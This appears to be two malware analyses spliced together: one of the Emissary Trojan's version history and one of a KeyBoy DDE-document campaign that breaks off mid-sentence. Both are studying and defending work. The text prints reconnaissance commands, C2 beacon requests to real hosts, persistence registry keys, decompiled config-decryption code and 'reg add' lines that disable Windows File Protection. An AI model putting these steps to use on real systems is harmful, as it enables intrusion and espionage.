prompt:\\xa0ECHO VERVERECHO IPCONFIG /ALLIPCONFIG /ALLECHO NET LOCALGROUP ADMINISTRATORSNET LOCALGROUP ADMINISTRATORSECHO NET STARTNET STARTECHO GPRESULT /ZGPRESULT /ZECHO GPRESULT\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0/SCOPE COMPUTER /ZGPRESULT\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0 /SCOPE COMPUTER /ZECHO SYSTEMINFOSYSTEMINFO\\nEmissary parses command and control responses for “instru”, which will precede a GUID value that designates the command the C2 server wishes to execute on the system. The command handler does not use a nested if/else or switch statement like most malware families, instead Emissary creates a structure that contains all of the available command GUIDs that it will iterate through each time the C2 supplies a GUID in order to determine which command the operator wishes to execute. Emissary can include up to 32 different commands within this data structure, but it appears the author has decided to include six commands within the Trojan.

The Emissary configuration is now encrypted using a custom algorithm that uses the “srand” function to seed the “rand” function using a value of 2563. This seed value causes the “rand” function to generate the same values each time, which Emissary will use as a key along with the XOR operation. The configuration now contains the version number of Emissary, instead of the version being hardcoded into the Trojan.\\nThis version of Emissary keeps track of which C2 location within its configuration that it has been communicating with by storing the index of the C2 server (1, 2, or 3) in the following registry key:\\nSOFTWARE\\\\Microsoft\\\\VBA\\\\VbaList\\n1\\nSOFTWARE\\\\Microsoft\\\\VBA\\\\VbaList\\nThis version of Emissary moves away from the command handler using the structure and moves to a nested if/else statement for less complicated command handling; however, the command GUID and commands themselves are unchanged.\\nThe Emissary version 2.0 beacon changed slightly from previous versions, specifically the removal of the User-Agent field and the use of a lowercase “h” in the “Host” field. The following is an example of the version 2.0 beacon, which contains the same GUID and “op” values:\\nGET /0test/test/default.aspx HTTP/1.1\\nhost: 163.20.127.27\\nCookie: guid=af44f802-ba5c-4b3c-8c6b-2ea411058678; op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6;\\n123\\nGET /0test/test/default.aspx HTTP/1.1host: 163.20.127.27Cookie: guid=af44f802-ba5c-4b3c-8c6b-2ea411058678; op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6;\\nVersion 2.0 also introduces a debug message logging system that includes verbose error messages that are accompanied by an error ID number.

The configuration now contains settings for the Emissary service, which the Trojan will store in and access from the following registry keys:\\nSOFTWARE\\\\Microsoft\\\\VBA\\\\Serv -> Service Name\\nSOFTWARE\\\\Microsoft\\\\VBA\\\\VbaList -> Binary Path for the Service\\nAlso, this version of Emissary was created using Microsoft Foundation Classes (MFC) to carry out a majority of its functionality. For instance, instead of manually building an HTTP request as in previous versions, this version uses the MFC functions to create the HTTP request and send it to the C2 server:\\nCInternetSession::CInternetSession\\nCInternetSession::GetHttpConnection\\nCHttpConnection::OpenRequest\\nCHttpFile::AddRequestHeaders\\nCInternetSession::SetCookie\\nCHttpFile::SendRequest\\nUsing these classes creates a significantly different HTTP request sent to the C2 server, but the functionality of obtaining instructions from the C2 is the same. The following is an example of a beacon generated by this sample, which contains the same “op” value and has additional fields within the HTTP header:\\nGET /lightserver/Default.aspx HTTP/1.0\\nCache-Control: no-cache\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\\nHost: groupspace.findhere.org\\nCookie: guid=8E550BBD-F5DB-4471-BBC7-E8768BD5003E; op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6\\n12345\\nGET /lightserver/Default.aspx HTTP/1.0Cache-Control: no-cacheUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)Host: groupspace.findhere.orgCookie: guid=8E550BBD-F5DB-4471-BBC7-E8768BD5003E; op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6\\nThe logging functionality within this update no longer includes error ID values, but still contains verbose debug messages that are written to a file named %TEMP%\\\\msmqinst.ax.\\nVersion 3.0\\nDate: 12/24/2014\\nSHA256: dcbeca8c92d6d18f2faf385e677913dc8abac3fa3303c1f5cfe166180cffbed3\\nOriginal Name: Generic.dll\\nBug fixes:\\nAdded a function to the configuration update command that checks to see if the C2 provided a new sleep interval at offset 460 and uses the interval stored in the VbaData registry key if its missing. This fixes the bug that would not allow the sleep interval to update correctly.\\nVersion 4.0\\nDate: 3/26/2015\\nSHA256: 5171c9a593389011da4d72125e52bf7ef86b2da7fcd6c2a2bc95467afe6a1b58\\nOriginal Name: Generic.dll\\nThis version of Emissary includes both the installation and loading functionality along with the Emissary functional code in the same file. The installation and loading portion of the Trojan is called using an exported function named “Setting”, which moves the file to:\\n%TEMP%\\\\Remdisk.dll\\n1\\n%TEMP%\\\\Remdisk.dll\\nThe loading portion of this version of Emissary checks the permissions of the current user and either installs Emissary as a service or as a standalone Trojan. To install as a service, the loader will enumerate the services on the system looking for services running under the “netsvcs” group, and it will attempt to hijack the first “netsvcs” service by replacing the “ServiceDLL” parameter to point to the Emissary DLL. For instance, during the analysis period, the installation code changed the following registry key of the AppMgmt:\\nHKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\AppMgmt\\\\Parameters\\\\ServiceDll: \"%SystemRoot%\\\\System32\\\\appmgmts.dll\"\\n1\\nHKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\AppMgmt\\\\Parameters\\\\ServiceDll: \"%SystemRoot%\\\\System32\\\\appmgmts.dll\"\\nto\\nHKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\AppMgmt\\\\Parameters\\\\ServiceDll: \"C:\\\\DOCUME~1\\\\ADMINI~1\\\\LOCALS~1\\\\Temp\\\\Remdisk.dll\"\\n1\\nHKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\AppMgmt\\\\Parameters\\\\ServiceDll: \"C:\\\\DOCUME~1\\\\ADMINI~1\\\\LOCALS~1\\\\Temp\\\\Remdisk.dll\"\\nIf the user does not have permissions to add a service, the installation routine attempts to add persistence by creating the following registry key that will run the functional code within Emissary via an exported function named “DllRegister”:\\nSoftware\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Resolves: \"Rundll32.exe C:\\\\DOCUME~1\\\\ADMINI~1\\\\LOCALS~1\\\\Temp\\\\Remdisk.dll,DllRegister\"\\n1\\nSoftware\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Resolves: \"Rundll32.exe C:\\\\DOCUME~1\\\\ADMINI~1\\\\LOCALS~1\\\\Temp\\\\Remdisk.dll,DllRegister\"\\nThis version of emissary has its configuration appended to the end of the DLL, specifically starting at offset 0xc600. The following code accesses the configuration embedded within the DLL and decrypts it using a single byte XOR algorithm using 65 as the key:\\nSetFilePointer(v2, 0xC600, 0, 0);\\nReadFile(h_emissary_dll_file, buffer_for_config, 0x1D0u, &NumberOfBytesRead, 0);\\niteration_count = 0;\\ndo\\n*(iteration_count++ + buffer_for_config) += 65;\\nwhile ( iteration_count < 0x1D0 );\\n123456\\nSetFilePointer(v2, 0xC600, 0, 0);ReadFile(h_emissary_dll_file, buffer_for_config, 0x1D0u, &NumberOfBytesRead, 0);iteration_count = 0;do\\xa0\\xa0*(iteration_count++ + buffer_for_config) += 65;while ( iteration_count < 0x1D0 );\\nThis algorithm differs from the algorithm introduced in Emissary version 2.0 that used the srand and rand functions to generate a key to use in conjunction with the XOR operation. With the configuration embedded within the Emissary DLL, each Emissary version 4.0 sample will have a different hash as the configuration data changes.\\nThe network beacon sent from Emissary version 4.0 is the same as other previous versions starting at version 2.0, as seen in the following:\\nGET /lightserver/Default.aspx HTTP/1.0\\nCache-Control: no-cache\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\\nHost: 210.209.121.92\\nCookie: guid=7DA53AE4-C155-40b3-8EB3-60C4FCE99025; op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6\\n12345\\nGET /lightserver/Default.aspx HTTP/1.0Cache-Control: no-cacheUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)Host: 210.209.121.92Cookie: guid=7DA53AE4-C155-40b3-8EB3-60C4FCE99025; op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6\\nVersion 3.0: Out-of-sequence\\nDate: 6/25/2015\\nSHA256: 70bed57bc3484fe5dbcf3c732bd7b11f80a742138f4733bc7e9b6d03e721da4a\\nOriginal Name: IISDLL.dll\\nMajor Overhaul\\nThe compilation time of one sample of Emissary version 3.0 on June 25, 2015 appears out of order, as it occurs after the compilation of Emissary version 4.0. The differences between this out of order sample compared to the other known version 3.0 sample, as well as version 4.0 for that matter, include a dramatic change in configuration storage and the handling of commands. Also, the files stored on the system have different names than Emissary versions in the past, which are:\\n%TEMP%\\\\000IISA758C8FEAE5F.TMP -> Log file\\n%APPDATA%\\\\LocalData\\\\75BD50EC.DAT -> Configuration file\\n%APPDATA%\\\\LocalData\\\\A08E81B411.DAT -> Emissary DLL\\n12345\\n%TEMP%\\\\000IISA758C8FEAE5F.TMP -> Log file\\xa0%APPDATA%\\\\LocalData\\\\75BD50EC.DAT -> Configuration file\\xa0%APPDATA%\\\\LocalData\\\\A08E81B411.DAT -> Emissary DLL\\nThis version of Emissary is designed to be injected into an Internet Explorer process by its associated loader Trojan, which marks the first time Emissary executes through DLL injection.\\nThis version of Emissary also has a different configuration structure than prior versions. The configuration is no longer stored in the registry; rather it is saved to a file named 75BD50EC.DAT. The Emissary DLL will skip to offset 0x488 within this file and read the next 132 bytes, which it will decrypt with a new algorithm as seen in the following:\\nSetFilePointer(h_config_file_1, 0x488, 0, 0);\\nReadFile(h_config_file, buffer_for_config, 132u, &NumberOfBytesRead, 0);\\nCloseHandle(h_config_file);\\nsrand(0xA03u);\\niteration_count = 0;\\ndo\\n*(buffer_for_config + iteration_count++) ^= rand() % 128;\\nwhile ( iteration_count < 0x84 );\\n12345678\\nSetFilePointer(h_config_file_1, 0x488, 0, 0);ReadFile(h_config_file, buffer_for_config, 132u, &NumberOfBytesRead, 0);CloseHandle(h_config_file);srand(0xA03u);iteration_count = 0;do\\xa0\\xa0*(buffer_for_config + iteration_count++) ^= rand() % 128;while ( iteration_count < 0x84 );\\nThe configuration structure has also changed as well, with Emissary now using the following structure:\\nstruct emissary_new_config {\\nWORD Emissary_version_major;\\nWORD Emissary_version_minor;\\nCHAR[36] GUID_for_sample;\\nWORD Unknown1;\\nCHAR[128] Server1;\\nCHAR[128] Server2;\\nCHAR[128] Server3;\\nCHAR[128] CampaignName;\\nCHAR[550] Unknown2;\\nWORD Delay_interval_seconds;\\n};\\n123456789101112\\nstruct emissary_new_config {WORD Emissary_version_major;WORD Emissary_version_minor;CHAR[36] GUID_for_sample;WORD Unknown1;CHAR[128] Server1;CHAR[128] Server2;CHAR[128] Server3;CHAR[128] CampaignName;CHAR[550] Unknown2;WORD Delay_interval_seconds;};\\nThis version of Emissary also introduced a new command handler that uses number-based commands instead of the GUID commands seen in prior versions of Emissary. The functionality of the commands are the same, however, the commands themselves are invoked using a number. Table 2 contains a list of available commands and a brief description of the functionality carried out by the command.\\nCommand\\nDescription\\n102\\nUpload a file to the C2 server.\\n103\\nExecutes a specified command.\\n104\\nDownload file from the C2 server.\\n105\\nUpdate configuration file.\\n106\\nCreate a remote shell.\\n107\\nUpdates the Trojan with a new executable.\\nTable 2: New Emissary command handler\\nThe network beacon sent from this version of Emissary is very similar to the beacon first introduced in Emissary version 2.0; however, the “op” value of “101” is hardcoded for the beacon and replaces the GUID based op designator to match the new command handler. The following is an example of the network beacon generated by this version of Emissary:\\nGET /default.aspx HTTP/1.1\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\\nHost: 101.55.33.92\\nCache-Control: no-cache\\nCookie: guid=cae5e213-395a-4023-9a12-f78d3c4718e5; op=101\\n12345\\nGET /default.aspx HTTP/1.1User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)Host: 101.55.33.92Cache-Control: no-cacheCookie: guid=cae5e213-395a-4023-9a12-f78d3c4718e5; op=101\\nVersion 5.0\\nDate: 8/25/2015\\nSHA256: c145bb2e4ce77c79aa01de2aec4a8b5b0b680e23bceda2c230903b5f0e119634, Original Name: WinDLL.dll\\nEmissary version 5.0 closely resembles the out-of-order version 3.0 sample, which suggests that the malware author just forgot to change the version number of the out of order sample. While the configuration and Emissary DLL filenames used by the version 5.0 Emissary sample are the same as the out-of-order version 3.0 sample, the log file name differs but only slightly, as seen in the following list of related files:\\n%TEMP%\\\\000A758C8FEAE5F.TMP -> Log File\\n%APPDATA%\\\\LocalData\\\\75BD50EC.DAT -> Configuration file\\n%APPDATA%\\\\LocalData\\\\A08E81B411.DAT -> Emissary DLL\\n%APPDATA%\\\\LocalData\\\\ishelp.dll -> Loader DLL\\n1234567\\n%TEMP%\\\\000A758C8FEAE5F.TMP -> Log File\\xa0%APPDATA%\\\\LocalData\\\\75BD50EC.DAT -> Configuration file\\xa0%APPDATA%\\\\LocalData\\\\A08E81B411.DAT -> Emissary DLL\\xa0%APPDATA%\\\\LocalData\\\\ishelp.dll -> Loader DLL\\nVersion 5.0 uses numbers within its command handler and the same configuration structure as the out-of-order version 3.0. The only major change in 5.0 is the ability to obtain a compromised system’s external IP address by performing an HTTP GET request to “http://showip.net/index.php”. The code will parse the response from this webserver for the following to obtain the system’s IP address:\\n<input id=\"checkip\" type=\"text\" name=\"check_ip\" value=\"[IP address parsed]\" />\\n1\\n<input id=\"checkip\" type=\"text\" name=\"check_ip\" value=\"[IP address parsed]\" />\\nThe SID value sent from the C2 server is encrypted using an algorithm that uses the XOR operation on the data using 0x76 as the key on the first byte and the resulting cleartext byte as the key on the next byte and so on. The network beacon sent from this version of Emissary visually resembles the out-of-order version, with the addition of a field “SHO” that contains the IP address of the compromised host. The following is an example of the Emissary version 5.0 network beacon, which is also the same in versions 5.1, 5.3 and 5.4 as well:\\nGET /default.aspx HTTP/1.1\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\\nHost: 101.55.33.95\\nCache-Control: no-cache\\nCookie: guid=8cdef38c-808a-4e29-af6e-7386f02d28f1; op=101; SHO=172.16.107.130\\n12345\\nGET /default.aspx HTTP/1.1User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)Host: 101.55.33.95Cache-Control: no-cacheCookie: guid=8cdef38c-808a-4e29-af6e-7386f02d28f1; op=101; SHO=172.16.107.130\\nVersion 5.1\\nDate: 9/29/2015\\nSHA256: 375190cc8e0e75cf771d66347ea2a04b6d1b59bf2f56823eb81270618f133e2d\\nOriginal Name: WinDLL.dll\\nFor version 5.1 the malware author took out the exception handling in the Upload File command and obfuscated two strings within the Trojan to avoid detection. The strings exist in the Trojan in encrypted form and are decrypted using an algorithm that uses addition to each byte of ciphertext, using 65 (“A”) as a key. The obfuscated strings, as seen below, involve the filename of the log file and the command prompt executable used to create the remote shell:\\n\\\\xEF\\\\xEF\\\\xEF\\\\x00\\\\xF6\\\\xF4\\\\xF7\\\\x02\\\\xF7\\\\x05\\\\x04\\\\x00\\\\x04\\\\xF4\\\\x05\\\\xED\\\\x13\\\\x0C\\\\x0F = 000A758C8FEAE5F.TMP\\n\\\\x22\\\\x2C\\\\x23\\\\xED\\\\x24\\\\x37\\\\x24 = cmd.exe\\n12\\n\\\\xEF\\\\xEF\\\\xEF\\\\x00\\\\xF6\\\\xF4\\\\xF7\\\\x02\\\\xF7\\\\x05\\\\x04\\\\x00\\\\x04\\\\xF4\\\\x05\\\\xED\\\\x13\\\\x0C\\\\x0F = 000A758C8FEAE5F.TMP\\\\x22\\\\x2C\\\\x23\\\\xED\\\\x24\\\\x37\\\\x24 = cmd.exe\\nDate: 10/14/2015\\nSHA256: e369417a7623d73346f6dff729e68f7e057f7f6dae7bb03d56a7510cb3bfe538\\nOriginal Name: WinDLL.dll\\nIn an attempt to avoid detection based on PE header hashes, version 5.1 was recompiled without making any changes.\\nVersion 5.3\\nDate: 11/7/2015\\nSHA256: 29d8dc863427c8e37b75eb738069c2172e79607acc7b65de6f8086ba36abf051\\nOriginal Name: WinDLL.dll\\nEmissary 5.3 moved some code used to create the remote shell out of a sub-function in an attempt to evade signatures used to detect the remote shell creation. For instance, in Emissary 5.1 the command handler would call an initial subfunction that would then call a second subfunction to carry out the activities to create and interact with the remote shell. In 5.3, the command handler calls an initial subfunction that carries out the activities to create and interact with the remote shell.\\nVersion 5.4\\nDate: 11/23/2015\\nSHA256: 69b1d5454abe2475257defd9962a24a92411212c4f592de8765369a97f26c037 (Base DLL with junk data removed)\\nOriginal Name WinDLL.dll\\nVersion 5.4 of Emissary was the basis for the blog “ELISE: Security Through Obesity” by Michael Yip of PWC. This blog provides a great analysis of this version of Emissary and we highly suggest reading it to become familiar with the Trojan.\\nThere is one difference in the functional code between Emissary versions 5.3 and 5.4, which involves the removal of the command ‘107’ used to update the Trojan. The string ‘107’ still exists within the Trojan, however, the command handler does not check the C2 response for this command and the code used to update the Trojan has been removed.\\nThe major difference between Emissary version 5.4 and all previous versions is how the Trojan is saved and loaded. First, the filenames of the various components of Emissary changed to the following; however, the filename for debug logs has not changed:\\n%APPDATA%\\\\Programs\\\\Syncmgr.dll -> Loader Trojan\\n%APPDATA%\\\\Programs\\\\60HGBC00.DAT -> Configuration File\\n%APPDATA%\\\\Programs\\\\WEB2013BW6.DAT -> Emissary Trojan\\n%TEMP%\\\\000A758C8FEAE5F.TMP -> Log file\\n1234567\\n%APPDATA%\\\\Programs\\\\Syncmgr.dll -> Loader Trojan\\xa0%APPDATA%\\\\Programs\\\\60HGBC00.DAT -> Configuration File\\xa0%APPDATA%\\\\Programs\\\\WEB2013BW6.DAT -> Emissary Trojan\\xa0%TEMP%\\\\000A758C8FEAE5F.TMP -> Log file\\nIn addition to file name changes, the biggest (pardon the pun) change involves the Loader Trojan (Syncmgr.dll) appending junk data to the end of the Emissary DLL file to make incredibly large files. The reason for creating such large files is to trick antivirus applications into not scanning the file, as it could exceed the maximum size of files the antivirus can scan (even VirusTotal has a maximum file size of 128MB). For instance, the following pseudo code contains two loops that will end up appending 524,288,000 bytes to the end of file, resulting in a DLL that exceeds 500MB in size:\\nWriteFile(hFile, buf_EmissaryDllFromResource, nNumberOfBytesToWrite, &nNumberOfBytesToWrite, 0);\\nbuf_junkData = 0;\\nret_time = time(0);\\nsrand(ret_time);\\nfor ( i = 0; i < 51200; ++i )\\n{\\nfor ( j = 0; j < 640; ++j )\\n{\\nrandom_byte = rand() % 255;\\noffset_in_buff_junkData = &buf_junkData + 16 * j;\\ndword_junkData = 0x1010101 * random_byte;\\n*offset_in_buff_junkData = dword_junkData;\\n*(offset_in_buff_junkData + 1) = dword_junkData;\\n*(offset_in_buff_junkData + 2) = dword_junkData;\\n*(offset_in_buff_junkData + 3) = dword_junkData;\\n}\\nWriteFile(hFile, &buf_junkData, 0x2800u, &nNumberOfBytesToWrite, 0);\\n}\\n123456789101112131415161718\\nWriteFile(hFile, buf_EmissaryDllFromResource, nNumberOfBytesToWrite, &nNumberOfBytesToWrite, 0);buf_junkData = 0;ret_time = time(0);srand(ret_time);for ( i = 0; i < 51200; ++i ){\\xa0\\xa0for ( j = 0; j < 640; ++j )\\xa0\\xa0{\\xa0\\xa0\\xa0\\xa0random_byte = rand() % 255;\\xa0\\xa0\\xa0\\xa0offset_in_buff_junkData = &buf_junkData + 16 * j;\\xa0\\xa0\\xa0\\xa0dword_junkData = 0x1010101 * random_byte;\\xa0\\xa0\\xa0\\xa0*offset_in_buff_junkData = dword_junkData;\\xa0\\xa0\\xa0\\xa0*(offset_in_buff_junkData + 1) = dword_junkData;\\xa0\\xa0\\xa0\\xa0*(offset_in_buff_junkData + 2) = dword_junkData;\\xa0\\xa0\\xa0\\xa0*(offset_in_buff_junkData + 3) = dword_junkData;\\xa0\\xa0}\\xa0\\xa0WriteFile(hFile, &buf_junkData, 0x2800u, &nNumberOfBytesToWrite, 0);}\\nWith the new filenames, malware persistence is achieved via the following registry key:\\nHKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Syncmgr: \"rundll32.exe \"C:\\\\Documents and Settings\\\\[username]>\\\\Application Data\\\\Programs\\\\Syncmgr.dll\",Setting\"\\n1\\nHKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Syncmgr: \"rundll32.exe \"C:\\\\Documents and Settings\\\\[username]>\\\\Application Data\\\\Programs\\\\Syncmgr.dll\",Setting\"\\nDate: 11/24/2015\\nSHA256: bfceccdd553c7e26006bb044ea6d87e597c7cce08218068e31dc940e9f55b636 (Base DLL with junk data removed)\\nOriginal Name: WinDLL.dll\\nIn another attempt to avoid detection based on PE header hashes, the Trojan was recompiled without making any changes.\\nConclusion\\nThe actors using Emissary, who were previously reported as behind Operation Lotus Blossom, have been active for at least seven years in Southeast Asia. They are persistent, evolve over time, and have enough resources to have multiple custom RATs that receive regular updates. The targeting is largely military or government, with some cases of higher education and high tech companies. They also have the ability to select and use appropriate decoys in multiple Asian languages that appear legitimate.\\nThe use of Emissary appears to be focused only on Taiwan and Hong Kong, with regular malware updates to avoid detection and to increase the odds of success. Of particular note, there is an interesting coincidence between the timing of the publication of our Operation Lotus Blossom report and a flurry of Emissary updates. The first occurred ten days after publication and was followed by updates over increasingly shorter time frames, starting at roughly every three months and progressing to monthly by the final version discussed here. Until that publication, according to our research Emissary was updated roughly every two years. This indicates the threat actors may take note of threat intelligence reporting and are fully capable of making immediate changes when deemed necessary.\\nIn addition to the malware evolution, the actors also shifted from solely spear-phishing targets with attachments to also compromising legitimate websites to host malware. The consistent updates to the Trojan and the shift in the actor’s TTPs suggests that this threat will continue to use Emissary in future espionage related attacks.\\nWe have updated the Emissary tag for Palo Alto Networks AutoFocus users to track this threat using the indicators discussed in this blog.\\nEmissary Delivery

KeyBoy has been most recently reported on by CitizenLab in 2016, and now appears to have returned.\\nAnalysisOur analysis starts with a Microsoft Word document named 2017 Q4 Work Plan.docx (with a hash of 292843976600e8ad2130224d70356bfc), which was created on 2017-10-11 by a user called “Admin’’, and first uploaded to VirusTotal, a website and file scanning service, on the same day, by a user in South Africa.Curiously, the Word document does not contain any macros, or even an exploit. Rather, it uses a technique recently reported on by SensePost, which allows an attacker to craft a specifically created Microsoft Word document, which uses the Dynamic Data Exchange (DDE) protocol. DDE traditionally allows for the sending of messages between applications that share data, for example from Word to Excel or vice versa. In the case reported on by SensePost, this allowed for the fetching or downloading of remote payloads, using PowerShell for example.\\nFigure 1 – Word Error\\nOnce we extract the initial document, using 7-zip for example, we can observe the usual structure, and inside, a file called document.xml is of interest. In this XML, a remote payload, in this case a DLL, will be downloaded using PowerShell, moved to the user’s temporary folder, and run using rundll32.exe, starting in the HOK function or export. Figure 2 shows the relevant part in our XML file.\\nFigure 2 - Download and payload execution\\nThis debug.dll is a PE32 binary file with the following properties:md5 hash: 64b2ac701a0d67da134e13b2efc46900sha1 hash: 1bb516d70591a5a0eb55ee71f9f38597f3640b14sha256 hash: f3f55c3df39b85d934121355bed439b53501f996e9b39d4abed14c7fe8081d92size: 531,456 bytesinternal DLL name: InstallClient.dllcompiler: Microsoftlinker: Microsoft Linker(14.0)[DLL32]compilation time: 2017-07-06 08:50:10This DLL serves as a dropper for the actual payload, and as such the internal name of ‘InstallClient’ is an apt choice by the threat actor. Developing a Yara rule for the simple dropper DLL, yielded several new binaries:1dbbdd99cb8d7089ab31efb5dcf097065708e0320879de6f9ac928046b1e4f4ea6903d93f9d6f328bcfe3e196fd8c78bcf6f333f99ee6342d6735ac2f6a37c1eac9b8c82651eafff9a3bbe7c69d69447d6ddecdb823de235dd650c0f7a2f3d8fWe have analysed d6ddecdb823de235dd650c0f7a2f3d8f, which also has InstallClient.dll as its internal name, as it seems to be the earliest dropper DLL used in this campaign, and does not appear to be very different from any of the other DLLs so far uncovered.The DLL starts in the function named Insys, which performs some simple checks, for example, if the current user account is an administrator, and will subsequently call the function named SSSS, which is the main function.A substantial amount of actions will follow according to what’s defined in the SSSS function, as follows:Prepare target DLL, in this case rasauto.dll, for replacement in C:\\\\Windows\\\\System32;Stop the service belonging to the target DLL, and use the takeown and icacls commands to gain full permissions for the system service DLL;Disable Windows File Protection, which normally prevents software or users from replacing critical Windows files;Suppress any error messages from Windows from popping up on boot;Copy the target DLL, rasauto.dll, to a new file named rasauto32.dll;Replace the target DLL with the malware’s DLL, which is time-stomped in order to evade detection;Start the now malicious service using net.exe and net1.exe; and,Create configuration and keylogs in C:\\\\Windows\\\\system32, using an uncommon extension, in this case .tsp, and additionally create a folder in C:\\\\Programdata for the purpose of screen captures.The malware will also, in some observed cases, output debug or error messages in a newly created file in the user’s Application Data folder as DebugLog.TXT, for example:\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Cookies\\\\DebugLog.TXTThen, the original dropper DLL will then be deleted, using a simple batch file that runs in a loop. In Figures 3 to 5, the target DLL, the original and new DLL, as well as the full process flow are shown.\\nFigure 3 - Target DLL, config and keylog file built dynamically on the stack\\nFigure 4 - Real and fake rasauto.dll (rasauto32.dll is the real or original DLL)\\nFigure 5 - Complete process flow\\nWhile visually there is apparently no difference, due to the malware being time-stomped (altering the created and modified dates of a file or folder), we can however observe a few subtle differences in the real and malicious binary.\\nFigure 6 - Subtle differences\\nAs can be seen in Figure 6, the fake DLL has a different link date, some minor spelling mistakes, and does not include the build in the file version details. As the malware also disables Windows File Protection and thus any pop-ups, it may not be immediately obvious to system administrators that a legitimate DLL was actually replaced. The following commands are issued in order to achieve persistence:reg add \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\" /v SFCDisable /t REG_DWORD /d 4 /freg add \"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Windows\" /v NoPopUpsOnBoot /t REG_DWORD /d 1 /f\\nTaking a look at the Windows registry for our service, RasAuto, short for Remote Access Auto Connection Manager and historically used for connecting dial-up modems to the internet for example, reveals no specific additional modifications.Dllhost.exe is additionally seen to call back or phone home to a hardcoded range of C2 servers, on ports 53, 80, and 443.\\nFigure 7 - Dllhost connecting to a remote address\\nDllhost usually has no need to connect to the internet or WAN, and as such it is a possible indicator of malicious activity.Attaching a debugger to dllhost.exe, reveals the keylogger files and configuration, replaced DLL file, as well as another folder, which is likely used to store screenshots and other data. Another ASCII string can be discovered in the DLL’s config, MDDEFGEGETGIZ, which likely pertains to the specific KeyBoy campaign, or target.\\nFigure 8 - ASCII dump\\nThe malware leveraged by KeyBoy has a plethora of functionality, including, but not limited to:Screen grabbing/taking screenshots;Determine public or WAN IP address (using a public IP service), likely for determining a suited target;Gather extended system information, such as information about the operating system, disks, memory and so on;A ‘file browser’ or explorer;Shutdown and reboot commands (in addition to the point below);Launching interactive shells for communicating with the victim machine;Download and upload functionality; andUsage of custom SSL libraries for masquerading C2 traffic.Interestingly enough, the malware developers left several unique debug messages, for example:GetScreenCmd from file:%sTake Screen Error,May no user login!Take Screen Error,service dll not existsEarlier, we mentioned the threat actor uses custom SSL libraries to communicate to the C2. While we have been unable to observe this behavior in any traffic logs, we were able to extract a certificate, which can be found in Appendix B. Converting this certificate to the DER format, we find strings pointing to jessma.org, and an email address, ldcsaa@21cn.com. These belong to projects by a Chinese developer, where one of the tools or libraries is named HP-Socket, which is a ‘High Performance TCP/UDP Socket Component’.Additionally, said library sported an interesting debug path:D:\\\\Work\\\\VS\\\\Horse\\\\TSSL\\\\TSSL_v0.3.1_20170722\\\\TClient\\\\Release\\\\TClient.pdbIn addition to writing a Yara rule for the dropper DLL and finding additional samples as mentioned above, we repeated the same process for the payload DLL. In Table 1 below, you may find other payloads, with their related and fake, or replaced Windows DLL or service.\\nHash\\nImpersonated DLL\\nImpersonated service\\na55b0c98ac3965067d0270a95e60e87e\\nikeext.dll\\nIKE and AuthIP IPsec Keying Modules\\n2e04cdf98aead9dd9a5210d7e601cca7\\nrasauto.dll\\nRemote Access Auto Connection Manager\\nd6ddecdb823de235dd650c0f7a2f3d8f\\nrasauto.dll\\nRemote Access Auto Connection Manager\\n1dbbdd99cb8d7089ab31efb5dcf09706\\nsinet.dll\\nUnknown\\n581ddf0208038a90f8bc2cdc75833425\\nsinet.dll\\nUnknown\\nTable 1 - Impersonated DLLs\\nSinet.dll may relate to SPlayer, a popular video player in China.Related samplesHunting further, we have discovered similar samples to the ones described above, with additional interesting debug paths:\\nHash\\nDebug path\\n7d39cef34bdc751e9cf9d46d2f0bef95\\nD:\\\\work\\\\vs\\\\UsbFerry_v2\\\\bin\\\\UsbFerry.pdb\\n29e44cfa7bcde079e9c7afb23ca8ef86\\nE:\\\\Work\\\\VS Project\\\\cyassl-3.3.0\\\\out\\\\SSLClient_x64.pdb\\nTable 2 - Other debug paths\\nBoth samples include references to a “work” folder, and a “VS” or “VS Project”. The latter likely points to a Visual Studio project short name, or VS. While the connection initially seems rather weak, it did hit the same Yara rule as mentioned before and the sample with hash 29e44cfa7bcde079e9c7afb23ca8ef86 additionally includes an SSL certificate, which, when converted, points to another custom SSL library, called WolfSSL, which is a “a small, fast, portable implementation of TLS/SSL for embedded devices to the cloud”. The same hash or binary also includes what we assess to be a campaign name or KeyBoy version identifier, which is weblogic20170727.Another sample which hit our Yara rule is 7aea7486e3a7a839f49ebc61f1680ba3, which was first uploaded to VirusTotal on 2017-08-25. This sample appears to be an older variant of KeyBoy, as there are several plain-text strings present, which are consistent with CitizenLab’s report referenced in the introduction.All samples (hashes) and other indicators are provided in Appendix A.InfrastructureWe have mapped out the complete infrastructure that we have discovered, using Maltego, as shown in Figure 